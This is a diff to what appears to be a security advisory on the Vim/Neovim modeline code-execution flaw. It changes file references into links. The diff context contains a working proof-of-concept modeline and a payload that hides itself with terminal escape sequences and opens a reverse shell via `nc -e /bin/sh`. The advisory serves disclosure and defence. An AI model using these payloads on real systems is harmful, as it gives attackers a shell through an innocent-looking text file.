@@ -21,7 +21,7 @@ execution via modelines by opening a specially crafted text file.
 Proof of concept
 ----------------
 
-- Create `poc.txt`:
+- Create [`poc.txt`](../data/2019-06-04_ace-vim-neovim/poc.txt):
 
       :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
 
@@ -42,7 +42,7 @@ be immediately rewritten when opened. Also, the PoC uses terminal escape
 sequences to hide the modeline when the content is printed with `cat`. (`cat
 -v` reveals the actual content.)
 
-`shell.txt`:
+[`shell.txt`](../data/2019-06-04_ace-vim-neovim/shell.txt):
 
     \x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n
 
